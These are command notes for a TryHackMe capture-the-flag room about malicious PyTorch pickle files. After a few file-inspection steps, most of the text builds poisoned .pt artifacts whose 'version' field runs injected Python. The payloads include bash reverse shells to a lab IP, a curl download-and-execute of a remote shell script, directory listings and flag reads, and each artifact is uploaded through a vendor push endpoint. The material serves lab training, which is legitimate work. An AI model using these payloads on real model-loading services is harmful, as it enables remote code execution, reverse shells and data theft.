# TryHackMe room Cypheron https://tryhackme.com/room/cypheron
# YouTube video walk through: https://youtu.be/P_sUtfPP_pM

```
python3 -m pickletools -a  data.pkl > decompiled_pickle.txt
```

```
pip install fickling
```

```
fickling  data.pkl
```

```
xxd data/0
strings -a -n 4 data/0
cat data/0
```

```
pip install torch --index-url https://download.pytorch.org/whl/cpu
```

# == shell ==

```
python3 make_torch_probe.py --field version --expr "__import__('subprocess').getoutput('bash -c \"bash -i >& /dev/tcp/10.129.116.27/4444 0>&1\"') " -o shell.pt
```

```
python3 make_torch_probe.py --field version --expr '__import__("subprocess").getoutput("bash -c \"bash -i >& /dev/tcp/10.129.116.27/4444 0>&1\"") ' -o shell.pt
```

```
python3 make_torch_probe.py   --field version   --expr "__import__('subprocess').getoutput('curl -o shell4.sh http://10.130.70.49:8000/shell.sh && /bin/sh shell4.sh') "   -o shell.pt
```

```
python3 make_torch_probe.py \
  --field version \
  --expr "'ROOT=' + str(__import__('os').listdir('/'))" \
  -o torch_ls_root.pt
```

```
curl -s -X POST \
  -F "artifact=@torch_ls_root.pt" \
  http://10.129.158.42:8000/vendor/push
```

```
python3 make_torch_probe.py \
  --field version \
  --expr "'APP=' + str(__import__('os').listdir('/app')) if __import__('os').path.isdir('/app') else 'NO_APP_DIR'" \
  -o torch_ls_app.pt
```

```
curl -s -X POST \
  -F "artifact=@torch_ls_app.pt" \
  http://10.129.158.42:8000/vendor/push  
```

```
python3 make_torch_probe.py \
  --field version \
  --expr "next((open(p).read().strip() for p in ['/flag','/root/flag.txt'] if __import__('os').path.exists(p)), 'FLAG_NOT_FOUND_IN_COMMON_PATHS')" \
  -o torch_read_common.pt
```

```
curl -s -X POST \
  -F "artifact=@torch_read_common.pt" \
  http://10.129.158.42:8000/vendor/push
```
# == read flag -==

```
python3 make_torch_probe.py \
  --field version \
  --expr "open('/flag').read().strip()" \
  -o torch_read_flag.pt
```

```
curl -s -X POST \
  -F "artifact=@torch_read_flag.pt" \
  http://10.129.158.42:8000/vendor/push  
```

# == redacted flag ===

```
python3 make_torch_probe.py \
  --field version \
  --expr "open('/flag').read(7) + '...[REDACTED]'" \
  -o torch_read_flag_preview.pt
```

``` 
curl -s -X POST \
  -F "artifact=@torch_read_flag_preview.pt" \
  http://10.129.158.42:8000/vendor/push
```
